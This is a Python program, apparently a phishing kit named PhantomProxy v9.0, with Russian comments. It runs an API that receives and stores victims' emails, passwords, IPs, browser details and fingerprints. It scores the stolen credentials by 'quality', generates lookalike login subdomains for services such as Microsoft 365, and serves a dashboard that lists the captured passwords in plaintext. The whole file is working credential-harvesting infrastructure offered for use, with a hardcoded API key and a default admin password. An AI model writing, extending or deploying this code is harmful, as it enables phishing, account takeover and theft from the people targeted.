#!/usr/bin/env python3
"""
PhantomProxy v9.0 - Unified All-in-One System
Единая программа со всеми функциями
"""

import os
import sys
import json
import sqlite3
import hashlib
import secrets
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# === КОНФИГУРАЦИЯ ===
class Config:
    VERSION = "9.0 UNIFIED"
    DB_PATH = Path(__file__).parent / 'phantom.db'
    TEMPLATES_PATH = Path(__file__).parent / 'templates'
    CERTS_PATH = Path(__file__).parent / 'certs'
    
    API_PORT = 8080
    HTTPS_PORT = 8443
    PANEL_PORT = 3000
    WEBSOCKET_PORT = 8765
    
    DOMAIN = "verdebudget.ru"
    API_KEY = "verdebudget-secret-2026"

# === БАЗА ДАННЫХ ===
class Database:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Таблицы
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            email TEXT, password TEXT, service TEXT, ip TEXT,
            user_agent TEXT, screen_resolution TEXT, timezone TEXT,
            cookies TEXT, local_storage TEXT, fingerprint TEXT,
            quality_score INTEGER, classification TEXT,
            created_at TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password_hash TEXT,
            role TEXT,
            created_at TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY,
            name TEXT, service TEXT, subdomains TEXT,
            status TEXT, created_at TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS triggers (
            id INTEGER PRIMARY KEY,
            name TEXT, condition TEXT, action TEXT,
            enabled INTEGER, created_at TEXT
        )''')
        
        # Админ по умолчанию
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            c.execute("INSERT INTO users VALUES (1, 'admin', ?, 'admin', ?)",
                     (admin_hash, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

# === AI SCORER ===
class AIScorer:
    @staticmethod
    def calculate(session):
        score = 0
        
        if session.get('email'): score += 20
        if session.get('password'): score += 30
        if session.get('user_agent'): score += 15
        if session.get('screen_resolution'): score += 10
        if session.get('timezone'): score += 10
        if session.get('ip') and session['ip'] != 'unknown': score += 15
        
        if score >= 80: classification = 'EXCELLENT'
        elif score >= 60: classification = 'GOOD'
        elif score >= 40: classification = 'AVERAGE'
        else: classification = 'LOW'
        
        return {'score': score, 'classification': classification}

# === SMART TRIGGERS ===
class SmartTriggers:
    def __init__(self, db):
        self.db = db
        self.triggers = []
    
    def check(self, session_data):
        triggered = []
        
        for trigger in self.triggers:
            if not trigger['enabled']:
                continue
            
            if self.evaluate(trigger['condition'], session_data):
                triggered.append(trigger)
                print(f"🎯 Trigger activated: {trigger['name']}")
        
        return triggered
    
    def evaluate(self, condition, data):
        if 'quality_score >=' in condition:
            threshold = int(condition.split('>=')[1].strip())
            return data.get('quality_score', 0) >= threshold
        
        if 'email contains' in condition:
            domain = condition.split('contains')[1].strip()
            return domain in data.get('email', '')
        
        return False

# === AUTO-ATTACK ===
class AutoAttack:
    def __init__(self, db):
        self.db = db
        self.prefixes = ['login', 'secure', 'auth', 'portal', 'account', 'sso']
    
    def generate_subdomain(self, service):
        import random
        prefix = random.choice(self.prefixes)
        service_short = service.split()[0].lower()
        return f"{prefix}-{service_short}.{Config.DOMAIN}"
    
    def create_campaign(self, service, count=10):
        subdomains = [self.generate_subdomain(service) for _ in range(count)]
        return {
            'service': service,
            'subdomains': subdomains,
            'count': len(subdomains),
            'created': datetime.now().isoformat()
        }

# === API SERVER ===
class APIServer(BaseHTTPRequestHandler):
    db = None
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/health':
            self.send_json({'status': 'ok', 'version': Config.VERSION})
        elif parsed.path == '/api/v1/stats':
            self.send_stats()
        elif parsed.path == '/api/v1/sessions':
            self.send_sessions()
        else:
            self.send_error(404)
    
    def do_POST(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/api/v1/credentials':
            self.save_credentials()
        elif parsed.path == '/api/v1/campaign':
            self.create_campaign()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_stats(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        self.send_json({'total': total, 'services': services})
    
    def send_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = [dict(row) for row in c.fetchall()]
        conn.close()
        
        self.send_json(sessions)
    
    def save_credentials(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        # AI Scoring
        quality = AIScorer.calculate(data)
        data['quality_score'] = quality['score']
        data['classification'] = quality['classification']
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
            (email, password, service, ip, user_agent, screen_resolution, 
             timezone, quality_score, classification, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (data.get('email', ''), data.get('password', ''),
             data.get('service', 'Unknown'), data.get('ip', ''),
             data.get('user_agent', ''), data.get('screen_resolution', ''),
             data.get('timezone', ''), quality['score'], quality['classification'],
             datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New session: {data.get('email', 'N/A')} ({quality['classification']})")
        
        self.send_json({'success': True, 'message': 'Saved'})
    
    def create_campaign(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        auto_attack = AutoAttack(self.db)
        campaign = auto_attack.create_campaign(data.get('service', 'Unknown'), data.get('count', 10))
        
        self.send_json(campaign)
    
    def log_message(self, format, *args):
        pass

# === PANEL SERVER ===
class PanelServer(BaseHTTPRequestHandler):
    db = None
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/' or parsed.path == '/index.html':
            self.show_dashboard()
        elif parsed.path == '/sessions':
            self.show_sessions()
        elif parsed.path == '/api/stats':
            self.api_stats()
        else:
            self.send_error(404)
    
    def show_dashboard(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service')
        services = c.fetchall()
        
        conn.close()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy v{Config.VERSION}</title>
    <meta charset="UTF-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #eee; min-height: 100vh; }}
        .header {{ background: rgba(22, 33, 62, 0.9); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }}
        .logo {{ font-size: 24px; font-weight: bold; color: #e94560; }}
        .container {{ padding: 40px; max-width: 1600px; margin: 0 auto; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin-bottom: 40px; }}
        .stat-card {{ background: rgba(22, 33, 62, 0.8); padding: 35px; border-radius: 15px; text-align: center; }}
        .stat-value {{ font-size: 56px; font-weight: bold; color: #e94560; }}
        .stat-label {{ color: #aaa; margin-top: 12px; }}
        .section {{ background: rgba(22, 33, 62, 0.8); padding: 35px; border-radius: 15px; margin-bottom: 30px; }}
        .section h2 {{ margin-bottom: 25px; color: #e94560; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(15, 52, 96, 0.8); }}
        tr:hover {{ background: rgba(15, 52, 96, 0.5); }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🚀 PhantomProxy v{Config.VERSION}</div>
        <div>
            <a href="/" style="background: #0f3460; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; margin-right: 10px;">Dashboard</a>
            <a href="/sessions" style="background: #0f3460; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none;">Sessions</a>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 35px;">📊 Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{total}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(services)}</div>
                <div class="stat-label">Services</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🏢 By Service</h2>
            <table>
                <tr><th>Service</th><th>Sessions</th></tr>
                {''.join(f'<tr><td>{s[0]}</td><td>{s[1]}</td></tr>' for s in services)}
            </table>
        </div>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head><title>Sessions - PhantomProxy</title></head>
<body style="font-family: Arial; background: #1a1a2e; color: #eee; padding: 40px;">
    <h1>📋 All Sessions</h1>
    <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
        <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>Quality</th><th>Time</th></tr>
'''
        for s in sessions:
            html += f"<tr><td>{s['id']}</td><td>{s['email']}</td><td>{s['password']}</td><td>{s['service']}</td><td>{s.get('classification', 'N/A')}</td><td>{s['created_at']}</td></tr>"
        
        html += '''</table>
    <br><a href="/" style="color: #e94560;">← Back to Dashboard</a>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def api_stats(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        conn.close()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'total': total}).encode())
    
    def log_message(self, format, *args):
        pass

# === MAIN PROGRAM ===
class PhantomProxy:
    def __init__(self):
        self.db = Database(Config.DB_PATH)
        self.running = False
        self.servers = []
    
    def start_api(self):
        server = HTTPServer(('0.0.0.0', Config.API_PORT), APIServer)
        APIServer.db = self.db
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        self.servers.append(('API', server))
        print(f"✅ API Server started on port {Config.API_PORT}")
    
    def start_panel(self):
        server = HTTPServer(('0.0.0.0', Config.PANEL_PORT), PanelServer)
        PanelServer.db = self.db
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        self.servers.append(('Panel', server))
        print(f"✅ Panel Server started on port {Config.PANEL_PORT}")
    
    def show_menu(self):
        while True:
            print("\n" + "="*60)
            print(f"  🚀 PHANTOMPROXY v{Config.VERSION} - UNIFIED SYSTEM")
            print("="*60)
            print("\n  MAIN MENU:")
            print("  1. Start All Services")
            print("  2. Stop All Services")
            print("  3. View Status")
            print("  4. View Statistics")
            print("  5. Create Campaign")
            print("  6. View Sessions")
            print("  7. Add Trigger")
            print("  8. Exit")
            print("\n  QUICK LINKS:")
            print(f"  - Panel: http://localhost:{Config.PANEL_PORT}")
            print(f"  - API: http://localhost:{Config.API_PORT}/health")
            print(f"  - HTTPS: https://localhost:{Config.HTTPS_PORT}/")
            print("="*60)
            
            choice = input("\n  Enter choice: ").strip()
            
            if choice == '1':
                self.start_all()
            elif choice == '2':
                self.stop_all()
            elif choice == '3':
                self.show_status()
            elif choice == '4':
                self.show_statistics()
            elif choice == '5':
                self.create_campaign()
            elif choice == '6':
                self.view_sessions()
            elif choice == '7':
                self.add_trigger()
            elif choice == '8':
                print("\n👋 Goodbye!")
                sys.exit(0)
            else:
                print("❌ Invalid choice")
    
    def start_all(self):
        print("\n🚀 Starting all services...")
        self.start_api()
        self.start_panel()
        print("\n✅ All services started!")
        print(f"\n📡 Panel: http://localhost:{Config.PANEL_PORT}")
        print(f"📡 API: http://localhost:{Config.API_PORT}/health")
    
    def stop_all(self):
        print("\n🛑 Stopping all services...")
        for name, server in self.servers:
            server.shutdown()
        self.servers.clear()
        print("✅ All services stopped!")
    
    def show_status(self):
        print("\n📊 SYSTEM STATUS:")
        print(f"  Services running: {len(self.servers)}")
        for name, _ in self.servers:
            print(f"    ✅ {name}")
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM users')
        users = c.fetchone()[0]
        conn.close()
        
        print(f"\n  Database:")
        print(f"    Sessions: {total}")
        print(f"    Users: {users}")
    
    def show_statistics(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service ORDER BY count DESC')
        services = c.fetchall()
        
        c.execute('SELECT classification, COUNT(*) FROM sessions GROUP BY classification')
        classifications = c.fetchall()
        
        conn.close()
        
        print("\n📊 STATISTICS:")
        print(f"  Total Sessions: {total}")
        print("\n  By Service:")
        for s in services:
            print(f"    {s[0]}: {s[1]}")
        print("\n  By Quality:")
        for c in classifications:
            print(f"    {c[0]}: {c[1]}")
    
    def create_campaign(self):
        service = input("\n  Target service (e.g., Microsoft 365): ").strip()
        count = input("  Number of subdomains (default 10): ").strip()
        count = int(count) if count else 10
        
        auto_attack = AutoAttack(self.db)
        campaign = auto_attack.create_campaign(service, count)
        
        print(f"\n✅ Campaign created!")
        print(f"  Service: {service}")
        print(f"  Subdomains: {count}")
        print("\n  Generated subdomains:")
        for sub in campaign['subdomains'][:5]:
            print(f"    - {sub}")
        if count > 5:
            print(f"    ... and {count - 5} more")
    
    def view_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT id, email, service, classification, created_at FROM sessions ORDER BY created_at DESC LIMIT 10')
        sessions = c.fetchall()
        conn.close()
        
        print("\n📋 LAST 10 SESSIONS:")
        print(f"  {'ID':<4} {'Email':<30} {'Service':<20} {'Quality':<12} {'Time'}")
        print("  " + "-"*90)
        for s in sessions:
            print(f"  {s[0]:<4} {s[1]:<30} {s[2]:<20} {s[3]:<12} {s[4]}")
    
    def add_trigger(self):
        name = input("\n  Trigger name: ").strip()
        condition = input("  Condition (e.g., quality_score >= 80): ").strip()
        action = input("  Action (telegram_notification/priority_alert/webhook): ").strip()
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute("INSERT INTO triggers (name, condition, action, enabled, created_at) VALUES (?, ?, ?, 1, ?)",
                 (name, condition, action, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"\n✅ Trigger '{name}' added!")

# === ЗАПУСК ===
if __name__ == '__main__':
    print("\n" + "="*60)
    print("  🚀 PHANTOMPROXY v9.0 - UNIFIED ALL-IN-ONE SYSTEM")
    print("="*60)
    print("\n  Initializing...")
    
    proxy = PhantomProxy()
    
    print("  ✅ Database initialized")
    print("  ✅ AI Scorer ready")
    print("  ✅ Smart Triggers ready")
    print("  ✅ Auto-Attack ready")
    
    print("\n  Starting menu...")
    proxy.show_menu()
